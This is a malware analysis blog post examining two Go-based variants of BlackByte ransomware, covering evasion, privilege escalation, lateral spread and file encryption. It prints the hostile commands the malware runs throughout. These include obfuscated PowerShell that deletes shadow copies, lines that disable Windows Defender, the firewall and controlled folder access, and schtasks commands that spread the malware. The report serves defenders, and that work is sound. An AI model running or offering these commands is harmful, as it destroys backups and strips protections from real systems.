id="sidebarContent"><p class="sidebar_navTopLabel__xl_5k">Contents</p><ol><li><a class="sidebar_link___4reK sidebar_linkActive__wuL2e" rel="noopener" href="#article">Article</a></li><li><a class="sidebar_link___4reK" rel="noopener" href="#more-blogs">More blogs</a></li></ol></div><div class="sidebar_copyUrlWrapper__n99w0  hidden lg:flex" style="border-bottom:none"><button type="button" class="sidebar_copyUrl__P5IEw">Copy URL</button></div><div class="sidebar_copyUrlWrapper__n99w0 flex lg:hidden" style="border-bottom:none;border-top:none"><button type="button" class="sidebar_copyUrl__P5IEw">Copy URL</button></div></div></div></div></div></div></div></div><div class="hidden lg:block" style="margin-bottom:-0px"></div><div class="" id="article"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2 class="wysiwyg_module_h1__mOSH6">Key Points</h2>

<ul>
	<li>BlackByte is a full-featured ransomware family that first emerged around July 2021</li>
	<li>The ransomware was originally written in C# and later redeveloped in the Go programming language around September 2021</li>
	<li>The threat group exfiltrates data prior to deploying ransomware and leaks the stolen information if a ransom is not paid</li>
	<li>The group has demanded multi-million dollar ransoms from some victims</li>
	<li>BlackByte ransomware employs various anti-analysis techniques including a multitude of dynamic string obfuscation algorithms</li>
	<li>In early versions of the ransomware, file encryption utilized a hardcoded 1,024-bit RSA public key along with a 128-bit AES key that was derived from a file retrieved from a command and control server</li>
	<li>More recent BlackByte versions use Curve25519 Elliptic Curve Cryptography (ECC) for asymmetric encryption and ChaCha20 for symmetric file encryption</li>
</ul>

<p> </p>

<h2 class="wysiwyg_module_h1__mOSH6">Introduction</h2>

<p><em>BlackByte</em> is a Ransomware-as-a-Service (RaaS) group that has been targeting corporations worldwide since July 2021. <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/">Previous versions of the ransomware</a> were written in C#. More recently, the authors redeveloped the ransomware using the Go programming language. The BlackByte Go variant was used in attacks described in an <a href="https://www.ic3.gov/Media/News/2022/220211.pdf">FBI advisory</a> that warned BlackByte had compromised numerous businesses, including entities in US critical infrastructure sectors. In this post, Zscaler ThreatLabz analyzes two variants of the Go-based implementation of BlackByte ransomware.</p>

<p> </p>

<h2 class="wysiwyg_module_h1__mOSH6">Technical Analysis</h2>

<p> </p>

<h2>Variants</h2>

<p>ThreatLabz has identified two variants of the Go-based variant of BlackByte. The first variant was seen in-the-wild around September 2021 and shares many similarities with the C# version including the commands executed to perform lateral propagation, privilege escalation, and file encryption algorithms. A more recent Go-based variant was introduced around February 2022. This new variant introduced many additional features and updated the file encryption algorithms. In this blog, for brevity, the Go-based BlackByte variant 1 will be referred to as BlackByte v1 and the second variant will be referred to as BlackByte v2.</p>

<p> </p>

<h2>Initialization</h2>

<p>Before BlackByte performs file encryption, the ransomware first performs initialization. Most of these initialization functions are very similar or identical to the C# variant of BlackByte.</p>

<p> </p>

<h3>Mutex Creation</h3>

<p>BlackByte creates a mutex using a value that is hardcoded in the malware, for example: <em>Global\7b55551e-a59c-4252-a34a-5c80372b3014</em>. If the mutex exists, BlackByte will terminate. This ensures that there is only one active instance of BlackByte running at a time.</p>

<p> </p>

<h3>Identify System Language</h3>

<p>BlackByte ransomware resolves the victim&#x27;s system language by comparing the language ID values with those shown in Table 1. If the system language matches any from this list, BlackByte will exit without performing file encryption.</p>

<p> </p>

<div>
<table><tbody><tr><td>
			<p><strong>Language ID</strong></p>
			</td><td>
			<p><strong>Language</strong></p>
			</td></tr><tr><td>
			<p>1049</p>
			</td><td>
			<p>Russian</p>
			</td></tr><tr><td>
			<p>1058</p>
			</td><td>
			<p>Ukrainian</p>
			</td></tr><tr><td>
			<p>1059</p>
			</td><td>
			<p>Belarusian</p>
			</td></tr><tr><td>
			<p>1064</p>
			</td><td>
			<p>Tajik</p>
			</td></tr><tr><td>
			<p>1067</p>
			</td><td>
			<p>Armenian</p>
			</td></tr><tr><td>
			<p>1068</p>
			</td><td>
			<p>Azerbaijani Latin</p>
			</td></tr><tr><td>
			<p>1079</p>
			</td><td>
			<p>Georgian</p>
			</td></tr><tr><td>
			<p>1087</p>
			</td><td>
			<p>Kazakh</p>
			</td></tr><tr><td>
			<p>1090</p>

			<p>Turkmen</p>
			</td></tr><tr><td>
			<p>1091</p>

			<p>Uzbek Latin</p>
			</td></tr><tr><td>
			<p>2092</p>
			</td><td>
			<p>Azerbaijani Cyrillic</p>
			</td></tr><tr><td>
			<p>2115</p>
			</td><td>
			<p>Uzbek Cyrillic</p>
			</td></tr></tbody></table>

<p> </p>

<p>Table 1. System languages avoided by BlackByte ransomware</p>

<p>These languages are specifically avoided by BlackByte to prevent encrypting files on systems that are located in Commonwealth of Independent States (CIS) countries. This likely indicates that the threat actors behind BlackByte are located in Eastern Europe and/or Russia. This is designed to reduce the threat that local law enforcement in those regions will pursue criminal prosecution against those responsible for BlackByte.</p>
</div>

<p> </p>

<h3>Enable Long Paths</h3>

<p>The malware executes the following command to avoid issues that may occur when encrypting files with long path names:</p>

<pre>
<strong>C:\WINDOWS\system32\cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f</strong></pre>

<p> </p>

<h3>Disable Controlled Folder Access</h3>

<p>BlackByte executes the following command to disable controlled folder access:</p>

<pre>
<strong>Set-MpPreference -EnableControlledFolderAccess Disabled</strong></pre>

<p>The Windows controlled folder access feature is designed to protect data from malicious applications such as ransomware. When enabled, files located in the specified protected folders can not be modified by unauthorized applications.</p>

<p> </p>

<h3>Delete Shadow Copies</h3>

<p>Similar to other ransomware families, BlackByte deletes shadow copies to prevent a victim from easily recovering files from backups. There are two methods that BlackByte uses to delete shadow copies. The first executes the following PowerShell command:</p>

<pre>
<strong>$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#x27;RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAg&#x27;+
&#x27;AFcAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8AC&#x27;+&#x27;AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAkA&#x27;+
&#x27;F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA==&#x27;));Invoke-Expression $x</strong></pre>

<p><br/>
The Base64 encoding string when decoded is the following: <strong>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}</strong></p>

<p>BlackByte also executes the commands to delete shadow copies for each drive:</p>

<pre>
<strong>C:\WINDOWS\system32\cmd.exe /c vssadmin resize shadowstorage /for=&lt;unit&gt;: /on=&lt;unit&gt;: /maxsize=401MB</strong>
<strong>C:\WINDOWS\system32\cmd.exe /c vssadmin resize shadowstorage /for=&lt;unit&gt;: /on=&lt;unit&gt;: /maxsize=unbounded</strong></pre>

<p> </p>

<h3>Process Termination and Stop / Start Services</h3>

<p>The following commands are executed by BlackByte to stop services that may hinder file encryption:</p>

<pre>
<strong>C:\WINDOWS\system32\sc.exe config SQLTELEMETRY start= disabled
C:\WINDOWS\system32\sc.exe config SQLTELEMETRY$ECWDB2 start= disabled
C:\WINDOWS\system32\sc.exe config SQLWriter start= disabled
C:\WINDOWS\system32\sc.exe config SstpSvc start= disabled
C:\WINDOWS\system32\sc.exe config MBAMService start= disabled
C:\WINDOWS\system32\sc.exe config wuauserv start= disabled</strong></pre>

<p>BlackByte will also start the following services:</p>

<pre>
<strong>C:\WINDOWS\system32\sc.exe config Dnscache start= auto
C:\WINDOWS\system32\sc.exe config fdPHost start= auto
C:\WINDOWS\system32\sc.exe config FDResPub start= auto
C:\WINDOWS\system32\sc.exe config SSDPSRV start= auto
C:\WINDOWS\system32\sc.exe config upnphost start= auto
C:\WINDOWS\system32\sc.exe config RemoteRegistry start= auto</strong></pre>

<p>BlackByte ransomware terminates the following processes shown in Table 2 at the beginning of the execution:</p>

<p> </p>

<table><tbody><tr><td>uranium</td><td>processhacker</td><td>procmon</td><td>pestudio</td><td>procmon64</td></tr><tr><td>x32dbg</td><td>x64dbg</td><td>cffexplorer</td><td>procexp64</td><td>procexp</td></tr><tr><td>pslist</td><td>tcpview</td><td>tcpvcon</td><td>dbgview</td><td>rammap</td></tr><tr><td>rammap64</td><td>vmmap</td><td>ollydbg</td><td>autoruns</td><td>autorunsc</td></tr><tr><td>regmon</td><td>idaq</td><td>idaq64</td><td>immunitydebugger</td><td>wireshark</td></tr><tr><td>dumpcap</td><td>hookexplorer</td><td>importrec</td><td>petools</td><td>lordpe</td></tr><tr><td>sysinspector</td><td>proc_analyzer</td><td>sysanalyzer</td><td>sniff_hit</td><td>windbg</td></tr><tr><td>joeboxcontrol</td><td>joeboxserver</td><td>joeboxserver</td><td>resourcehacker</td><td>fiddler</td></tr><tr><td>httpdebugger</td><td>dumpit</td><td>rammap</td><td>rammap64</td><td>vmmap</td></tr><tr><td>agntsvc</td><td>cntaosmgr</td><td>dbeng50</td><td>dbsnmp</td><td>encsvc</td></tr><tr><td>excel</td><td>firefox</td><td>firefoxconfig</td><td>infopath</td><td>isqlplussvc</td></tr><tr><td>mbamtray</td><td>msaccess</td><td>msftesql</td><td>mspub</td><td>mydesktopqos</td></tr><tr><td>mydesktopservice</td><td>mysqld</td><td>mysqld-nt</td><td>mysqld-opt</td><td>Ntrtscan</td></tr><tr><td>ocautoupds</td><td>ocomm</td><td>ocssd</td><td>onenote</td><td>oracle</td></tr><tr><td>outlook</td><td>PccNTMon</td><td>powerpnt</td><td>sqbcoreservice</td><td>sql</td></tr><tr><td>sqlagent</td><td>sqlbrowser</td><td>sqlservr</td><td>sqlwriter</td><td>steam</td></tr><tr><td>synctime</td><td>tbirdconfig</td><td>thebat</td><td>thebat64</td><td>thunderbird</td></tr><tr><td>tmlisten</td><td>visio</td><td>winword</td><td>wordpad</td><td>xfssvccon</td></tr><tr><td>zoolz</td><td>filemon</td><td>nsservice</td><td>nsctrl</td><td> </td></tr></tbody></table>

<p>Many of these process names are related to business applications. BlackByte kills these processes to avoid open file handle permission issues when performing file encryption of the victim&#x27;s files. In addition, the list contains a large number of malware analyst tools that can be used to reverse engineer the functionality of the ransomware.</p>

<p>BlackByte also terminates the following services that are associated with antivirus products, backup software, and business applications including financial software, email clients, and databases as shown below in Table 3.</p>

<p> </p>

<p>Table 3. Service names terminated by BlackByte ransomware</p>

<p> </p>

<h3>Windows Firewall</h3>

<p>BlackByte disables the Windows firewall via the command: </p>

<pre>
<strong>netsh advfirewall set allprofiles state off</strong></pre>

<p> </p>

<h3>Windows Defender</h3>

<p>The ransomware executes the following command to delete task manager, resource monitor, and stop the Windows Defender service:</p>

<p><strong>cmd /c del C:\Windows\System32\Taskmgr.exe /f /q &amp; del C:\Windows\System32\resmon.exe /f /q &amp;<br/>
powershell -command &quot;$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String<br/>
(&#x27;V&#x27;+&#x27;wBp&#x27;+&#x27;A&#x27;+&#x27;G4AR&#x27;+&#x27;AB&#x27;+&#x27;lAG&#x27;+&#x27;YAZQBuAGQA&#x27;));Stop-Service -Name $x;Set-Service -StartupType Disabled </strong></p>

<p>The Base64 encoded string above decodes to <em>WinDefend</em>.</p>

<p> </p>

<h3>Raccine Anti-Ransomware</h3>

<p>BlackByte terminates and uninstalls an anti-ransomware product known as Raccine. The Raccine processes that are terminated are <em>raccine.exe</em> and <em>raccinesettings.exe</em>. To uninstall Raccine, BlackByte deletes the following registry keys and values:</p>

<ul>
	<li><strong>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Raccine Tray</strong></li>
	<li><strong>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Application\Raccine</strong></li>
	<li><strong>HKEY_CURRENT_USER\SOFTWARE\Raccine</strong></li>
	<li><strong>HKEY_LOCAL_MACHINE\SOFTWARE\Raccine</strong></li>
</ul>

<p>BlackByte then deletes Raccine&#x27;s scheduled task via the command:</p>

<pre>
<strong>C:\WINDOWS\system32\schtasks.exe /DELETE /TN &quot;\&quot;Raccine Rules Updater\&quot;&quot; /F</strong>
</pre>

<p> </p>

<h3>Privilege Escalation</h3>

<p>The ransomware executes the following commands to disable UAC remote restrictions:</p>

<pre>
<strong>C:\WINDOWS\system32\cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</strong></pre>

<p>BlackByte sets the <em>EnableLinkedConnections</em> registry value to force symbolic links to be written to link logon sessions as follows:</p>

<pre>
<strong>C:\WINDOWS\system32\cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f</strong></pre>

<p>In BlackByte v2, an additional privilege escalation method was added that exploits the <a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512"><em>CMSTPLUA</em> COM interface to bypass UAC</a>. The <em>ShellExec</em> method of the interface <em>ICMLuaUtil</em> can be invoked with arbitrary commands with elevated privileges using the ElevationMoniker <strong>Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}</strong>. This allows BlackByte v2 to execute the <em>svchost.exe</em> process that it injects into with elevated privileges. This privilege escalation technique has also been utilized by other <a href="https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/">ransomware groups including REvil and LockBit</a>.</p>

<p> </p>

<h2>Lateral Propagation</h2>

<p>BlackByte ransomware performs network enumeration and can propagate across a local network. First it executes the following commands to enable network discovery and file and printer sharing:</p>

<pre>
<strong>C:\WINDOWS\system32\cmd.exe /c netsh advfirewall firewall set rule &quot;group=\&quot;Network Discovery\&quot;&quot; new enable=Yes
C:\WINDOWS\system32\cmd.exe /c netsh advfirewall firewall set rule &quot;group=\&quot;File and Printer Sharing\&quot;&quot; new enable=Yes</strong></pre>

<p>The following commands are then executed to discover other computers and network file shares:</p>

<pre>
<strong>net view
arp -a</strong>

</pre>

<p>BlackByte loads the Active Directory module RSAT-AD-PowerShell and queries for other computers via the following commands:</p>

<pre>
<strong>C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Install-WindowsFeature -Name \&quot;RSAT-AD-PowerShell\&quot; –IncludeAllSubFeature</strong></pre>

<pre>
<strong>powershell -command &quot;Import-Module ActiveDirectory;Get-ADComputer -Filter * -Properties * | FT Name&quot;</strong></pre>

<p>If the <em>-a</em> flag is passed via the command-line, BlackByte attempts to copy itself to remote computer&#x27;s public folders via the administrative share <em>\\&lt;remote_computer_name&gt;\c$\Users\Public\&lt;filename.exe&gt;</em>. If that attempt is unsuccessful, BlackByte will default to the path: <em>\\&lt;remote_computer_name&gt;\Users\Public\&lt;filename.exe&gt;</em>. BlackByte uses the Windows task scheduler to execute the ransomware on the remote host using the following command:</p>

<pre>
<strong>C:\Windows\system32\schtasks.exe /Create /S &lt;remote_computername&gt; /TN &lt;taskname&gt; /TR &quot;C:\Users\Public\&lt;filename&gt; -s &lt;passphrase&gt;&quot; /ru SYSTEM /sc onlogon /RL HIGHEST /f</strong>

</pre>

<p>In BlackByte v2, the filename and task name are pseudorandomly generated using a function that produces eight upper and lowercase alphabetic and numeric characters (e.g., <em>BqgDOVYL.exe</em> and <em>KYL8EpE9</em>, respectively). BlackByte v1 uses a hardcoded filename and command-line argument <em>complex.exe -single</em> and the hardcoded task name <em>asd</em>.</p>

<p>After scheduling the task, the remote BlackByte binary is executed using the command:</p>

<pre>
<strong>C:\Windows\system32\schtasks.exe /S &lt;remote_computername&gt; /Run /TN &lt;taskname&gt;</strong></pre>

<p>After the task is executed, BlackByte deletes the remote task using the command:</p>

<pre>
<strong>C:\Windows\system32\schtasks.exe /Delete /S &lt;remote_computername&gt; /TN &lt;taskname&gt; /f</strong></pre>

<p>BlackByte then deletes the copy of itself on the remote host network share. BlackByte also attempts to access administrative shares A$ through Z$ and the folders shown in Table 4.</p>

<p> </p>

<table><tbody><tr><td>Users</td><td>Backup</td><td>Veeam</td><td>Consejo</td><td>homes</td></tr><tr><td>home</td><td>media</td><td>common</td><td>Storage Server</td><td>Public</td></tr><tr><td>Web</td><td>Images</td><td>Downloads</td><td>BackupData</td><td>
			<p>ActiveBackupForBusiness</p>
			</td></tr><tr><td>Backups</td><td>NAS-DC</td><td>DCBACKUP</td><td>DirectorFiles</td><td>share</td></tr></tbody></table>

<p> </p>

<p>Table 4. Network shares targeted by BlackByte ransomware</p>

<p> </p>

<h3>Check for Analysis Tools</h3>

<p>The malware checks the following DLL modules in memory shown in Table 5 and exits if they are present:</p>

<p> </p>

<table><thead><tr><th>DLL Filename</th><th>Description</th></tr></thead><tbody><tr><td>DBGHELP.DLL</td><td>Windows DbgHelp Library</td></tr><tr><td>SbieDll.dll</td><td>Sandboxie</td></tr><tr><td>SxIn.dll</td><td>Qihu 360 Total Security</td></tr><tr><td>Sf2.dll</td><td>Avast Antivirus</td></tr><tr><td>snxhk.dll</td><td>Avast Antivirus</td></tr><tr><td>cmdvrt32.dll</td><td>COMODO Internet Security</td></tr></tbody></table>

<p> </p>

<p>Table 5. DLLs Identified by BlackByte ransomware</p>

<p> </p>

<h3>Disable Debugging</h3>

<p>BlackByte attempts to prevent debugging tools from monitoring and attaching to various processes by removing the following registry values under SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options:</p>

<ul>
	<li>vssadmin.exe</li>
	<li>wbadmin.exe</li>
	<li>bcdedit.exe</li>
	<li>powershell.exe</li>
	<li>diskshadow.exe</li>
	<li>net.exe</li>
	<li>taskkill.exe</li>
	<li>wmic.exe</li>
	<li>fsutil.exe</li>
</ul>

<p> </p>

<h3>Process Injection</h3>

<p>BlackByte v1 injects the ransomware code in an instance of <em>regedit.exe</em>, while BlackByte v2 injects itself into an instance of <em>svchost.exe.</em> After the process is injected with the ransomware code, the file encryption is then performed in the context of the <em>regedit.exe</em> or <em>svchost.exe</em> process. BlackByte then deletes its original binary on disk by executing the command:</p>

<pre>
<strong>C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 10 &gt; Nul &amp; Del &lt;blackbyte_filepath.exe&gt; /F /Q</strong></pre>

<p>The ping command is used to delay the file deletion by 10 seconds. The process injection functionality may be able to bypass some security software detections.</p>

<p> </p>

<h3>Unmount Virtual Machine Images</h3>

<p>In order to identify virtual machines on the victim&#x27;s system, BlackByte will execute the command:</p>

<pre>
<strong>powershell Get-VM</strong>
</pre>

<p>If any virtual machine files are located, BlackByte will attempt to unmount the image by executing the following command line:</p>

<pre>
<strong>powershell.exe Dismount-DiskImage -ImagePath &lt;filename.vhd&gt;</strong></pre>

<p> </p>

<h3>Backup Volumes</h3>

<p>The malware executes mountvol.exe to try to mount additional volumes:</p>

<pre>
<strong>C:\WINDOWS\system32\mountvol.exe A: \\?\Volume{[GUID]}\
C:\WINDOWS\system32\mountvol.exe B: \\?\Volume{[GUID]}\
C:\WINDOWS\system32\mountvol.exe E: \\?\Volume{[GUID]}\
C:\WINDOWS\system32\mountvol.exe F: \\?\Volume{[GUID]}\</strong></pre>

<p>This is likely an attempt to mount and encrypt backup volumes to further prevent file recovery after encryption.</p>

<p> </p>

<h2>File Encryption</h2>

<p>BlackByte enumerates all physical drives and network shares skipping files that contain the following substrings in Table 6:</p>

<p> </p>

<table><tbody><tr><td>blackbyte</td><td>ntdetect.com</td><td>bootnxt</td><td>ntldr</td><td>recycle.bin</td></tr><tr><td>bootmgr</td><td>thumbs.db</td><td>ntuser.dat</td><td>bootsect.bak</td><td>autoexec.bat</td></tr><tr><td>iconcache.db</td><td>bootfont.bin</td><td> </td><td> </td><td> </td></tr></tbody></table>

<p> </p>

<p>Table 6. BlackByte ransomware file substring filter list</p>

<p>BlackByte avoids the following extensions shown in Table 7.</p>

<p> </p>

<table><tbody><tr><td>url</td><td>msilog</td><td>log</td><td>ldf</td><td>lock</td></tr><tr><td>theme</td><td>msi</td><td>sys</td><td>wpx</td><td>cpl</td></tr><tr><td>adv</td><td>msc</td><td>scr</td><td>key</td><td>ico</td></tr><tr><td>dll</td><td>hta</td><td>deskthemepack</td><td>nomedia</td><td>msu</td></tr><tr><td>rtp</td><td>msp</td><td>idx</td><td>ani</td><td>386</td></tr><tr><td>diagcfg</td><td>bin</td><td>mod</td><td>ics</td><td>com</td></tr><tr><td>hlp</td><td>spl</td><td>nls</td><td>cab</td><td>exe</td></tr><tr><td>diagpkg</td><td>icl</td><td>ocx</td><td>rom</td><td>prf</td></tr><tr><td>themepack</td><td>msstyles</td><td>icns</td><td>mpa</td><td>drv</td></tr><tr><td>cur</td><td>diagcab</td><td>cmd</td><td>shs</td><td> </td></tr></tbody></table>

<p> </p>

<p>Table 7. File extensions skipped by BlackByte ransomware</p>

<p>BlackByte will also skip files located in the following directories shown in Table 8.</p>

<p> </p>

<table><tbody><tr><td>bitdefender</td><td>trend micro</td><td>avast software</td><td>intel</td><td>common files</td></tr><tr><td>programdata</td><td>windowsapps</td><td>appdata</td><td>mozilla</td><td>application data</td></tr><tr><td>google</td><td>windows.old</td><td>system volume information</td><td>program files (x86)</td><td>boot</td></tr><tr><td>tor browser</td><td>windows</td><td>intel</td><td>perflogs</td><td>msocache</td></tr></tbody></table>

<p> </p>

<p>Table 8. Directories whitelisted by BlackByte ransomware</p>

<p>BlackByte optimizes encryption speed based on the targeted file size according to the following rules:</p>

<p> </p>

<table><thead><tr><th>Filesize</th><th>Encryption Algorithm</th></tr></thead><tbody><tr><td>Size &lt;= 5MB</td><td>Encrypt the entire file</td></tr><tr><td>15MB &gt;= Size &gt; 5MB</td><td>Encrypt the first 1MB and last 1MB</td></tr><tr><td>150MB &gt;= Size &gt; 15MB</td><td>Encrypt the first 5MB and last 5MB</td></tr><tr><td>Size &gt; 150MB</td><td>Encrypt the first 50MB and last 50MB</td></tr></tbody></table>

<p> </p>

<p> </p>

<p>BlackByte renames encrypted files with the extension <em>.blackbyte</em>. The ransomware creates a <em>DefaultIcon</em> registry key under <em>HKEY_CLASSES_ROOT\.blackbyte</em> that points to an icon file, so that every file that is encrypted will show this icon in Windows explorer. In addition, the registry names <em>s1159</em> and <em>s2359</em> are set to <em>BLACKBYTE</em> under <em>HKEY_CURRENT_USER\Control Panel\International</em>. These registry values control the time format for AM/PM. As a result, Windows will show BLACKBYTE instead of AM/PM as shown below in Figure 2.</p>

<p><img height="305" src="https://lh4.googleusercontent.com/zrU1_0CAGURBJvvSmsglsIIgAjSvKjzBH0aUOyaRdKV3lmQ2vxTiX6cHxqVXuipfisbKWoJLo9yX3mb9HqJ3iZSfx6FOIp5u6KoqHp0PYPBOq_37P1YNg6BD1DthqqC-OjbilSXV" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 2. BlackByte AM/PM time format modification</p>

<p> </p>

<p>This time format modification is performed by executing the commands:</p>

<pre>
<strong>reg add &quot;HKCU\Control Panel\International&quot; /v s1159 /t REG_SZ /d BLACKBYTE /f</strong>
<strong>reg add &quot;HKCU\Control Panel\International&quot; /v s2359 /t REG_SZ /d BLACKBYTE /f</strong></pre>

<p> </p>

<h3>File Encryption Algorithms (Variant 1)</h3>

<p>BlackByte v1 must be executed with the command line argument <strong>-single</strong> followed by a SHA256 hash. This hash is combined with a TOR onion URL (e.g., <a href="hxxp://7oukjxwkbnwyg7cekudzp66okrchbuubde2j3h6fkpis6izywoj2eqad.%5Donion/">hxxp://7oukjxwkbnwyg7cekudzp66okrchbuubde2j3h6fkpis6izywoj2eqad[.]onion/</a>). The SHA256 hash given as an argument is concatenated to the onion URL to build the URL of the victim ransom portal that is embedded in the ransom note. This URL is substituted in the <strong>[LINK]</strong> field of the ransom note template.</p>

<p>When BlackByte v1 is executed, the malware tries to connect to a hardcoded URL that hosts a file that is involved in the construction of an AES key that is used to encrypt a victim&#x27;s files. An example URL used for this purpose was <a href="hxxps://185.93.6.31/mountain.%5Dpng">hxxps://185.93.6[.]31/mountain.png</a>. The mechanism used to build the AES key is <a href="https://github.com/SpiderLabs/BlackByteDecryptor/blob/main/BlackByteDecryptor/Decryptor.cs">very similar to the C# variant</a>.</p>

<p>After the content of the file mountain.png is downloaded, BlackByte reads the first 16 bytes of the file into a buffer and 24 bytes at the offset 0x410 of the file into another buffer. These 24 bytes are used as key to create and initialize a <a href="https://github.com/golang/go/blob/master/src/crypto/des/cipher.go">NewTripleDESCipher</a> object from the Go Cryptographic API. This object is used to decrypt the first 16 bytes of the file mountain.png. The resulting 16-byte buffer will be used as a PBKDF2 password to derive the AES key that will be used to encrypt the victim&#x27;s files. The BlackByte PBKDF2 algorithm uses SHA1 as the hashing function and 1,000 iterations to derive the AES key. The password is converted to unicode and the unicode string <em>BLACKBYTE_IS_COOL</em> is used as the salt. The following example Python code can be used to derive the AES key used for file encryption.</p>

<p> </p>

<p><img height="565" src="https://lh5.googleusercontent.com/JO2sCc46yEp8VJqkztt9jvvDr5J674fIltI94hoOeD0p4YrwLF1txMdk9ns9Y7ZXXoDTIVmy3OTFAIQ9L68KNZ3MuR5GdY_1a4v5xqST2qpqiMCVQkT1dYg5t7hMKt-rX3O9OFJe" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 3. Python code to decrypt BlackByte v1 files with the file (e.g., mountain.png) downloaded from the C2 server</p>

<p>Victim&#x27;s files are encrypted with AES using CBC mode. The first 16 bytes of the PBKDF2 derived key are used as AES key, and the same 16 bytes are used as the initialization vector (IV). The same AES key is used to encrypt all the files on a victim&#x27;s machine.</p>

<p>The PBKDF2 password is encrypted with a hardcoded 1,024-bit RSA public key and the resulting RSA-encrypted value is encoded with Base64. This Base64 encoded string is substituted in the <strong>[KEY]</strong> field in the ransom note template. The threat actor can decrypt the PBKDF2 password with their corresponding RSA private key, derive the AES key, and thereafter, decrypt the victim&#x27;s encrypted files. The following is an example RSA public key that was hardcoded in BlackByte:</p>

<p> </p>

<table><tbody><tr><td>
			<pre>
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDUBwECQuQiVGorPYvHrJM11OWV
E1PS8gaBqIAfPaR1rQHUEXu3iX/da/dCtV8Z27/SIA/ZYUNhTyUsX9Snjz8zve90
QAiG1c/BS81WWRax7M7i1rESStVwOaUDAj5w6cz9GwDMGYI+wve9Qyjtw5R6hr5I
qlIEig1Wy1X27vUC2wIDAQAB
-----END PUBLIC KEY-----</pre>
			</td></tr></tbody></table>

<p> </p>

<p> </p>

<h3>Ransom Note and BlackByte Icon (Variant 1)</h3>

<p>The BlackByte ransom note and an image containing an icon file are stored as Base64 encoded strings in the binary. After the encryption of the victim&#x27;s files, the ransom note is written to a file named <em>BlackByteRestore.txt</em>, and the previously mentioned icon file is written to a file named <em>BB.ico</em>. An example BlackByte v1 ransom note template is shown below in Figure 4. The BlackByte logo uses the extended ASCII characters of the 8-bit <a href="https://en.wikipedia.org/wiki/Code_page_437" title="Code page 437">code page 437</a> to create 3-D block letters.</p>

<p><img height="173" src="https://lh5.googleusercontent.com/svdxEizpcftjmYkB3qcrMlzKW9pHHfHKyX7WIGQusTMu7tEoerSTAgBDzN4Aid-lf-k-OBtM56rvVPcAaG6W0J8vwCyVfPUS34bJ1kVYe4dYSWrqtc5pzTE8fqWm8PQu7uFmYHWK" alt="Image" loading="lazy" decoding="async"/></p>

<p>Figure 4. Go-based BlackByte v1 ransom note template</p>

<p> </p>

<h3>File Encryption Algorithms (Variant 2)</h3>

<p>The second variant of BlackByte ransomware does not require a network connection to start encryption. In addition, the ransomware&#x27;s command-line parameters were modified. BlackByte v2 requires two command line parameters:</p>

<pre>
<strong>sample.exe &lt;flags&gt; &lt;passphrase&gt;</strong></pre>

<p>The first parameter is a flag (e.g., <strong>-a</strong>) that controls specific behaviors of the ransomware (e.g., to propagate across a network), while the second parameter is a passphrase (e.g., <strong>54726956</strong>) that is verified before file encryption commences. If BlackByte is not provided with any command-line arguments, the ransomware prints out the phrase <em>BlackByte ransomware, 8-th generation, the most destructive of all ransomware products, real natural disaster.</em> and exits.</p>

<p>BlackByte v2 removed the RSA and AES file encryption algorithms from the ransomware. The encryption algorithms were replaced with Curve25519 elliptic curve cryptography for asymmetric encryption and ChaCha for symmetric algorithm. The Curve25519 functions are statically compiled within BlackByte using <a href="https://cs.opensource.google/go/x/crypto/+/7b82a4e9:curve25519/curve25519.go">Go library code</a>. BlackByte generates a random 32-byte buffer per file using the Windows API function <em>RtlGenRandom()</em>. This random value is used as a file&#x27;s secret key. The file&#x27;s public key is calculated as follows:</p>

<p>file_public_key = Curve25519(file_secret_key, base_point = 0x9)</p>

<p>The threat actor&#x27;s Curve25519 public key is hardcoded in the binary and stored as a Base64 encoded string. For the sample with the SHA256 hash ffc4d94a26ea7bcf48baffd96d33d3c3d53df1bb2c59567f6d04e02e7e2e5aaa, the hardcoded Curve25519 public key was the string:</p>

<p><strong>2BSTzcpdqRW/a2DRT3TiL9lN5INRmmn1lCQWzZhkfQs=</strong> (d81493cdca5da915bf6b60d14f74e22fd94de483519a69f5942416cd98647d0b)</p>

<p>The shared secret is derived as follows:</p>

<p>shared_secret = Curve25519(file_secret_key, blackbyte_public_key)</p>

<p>The shared secret is hashed with SHA256 to derive a 32-byte ChaCha encryption key. The ChaCha encryption key is then hashed again with SHA256 to derive the ChaCha nonce (using 12 bytes starting at offset 10). Once the ChaCha key parameters have been derived, they will be used to encrypt the file&#x27;s content. The encrypted data is written to the file (overwriting the original content). Finally, the victim&#x27;s 32-byte public key is concatenated to the encrypted content of the file. The BlackByte v2 encryption algorithm is shown below in Figure 5.</p>

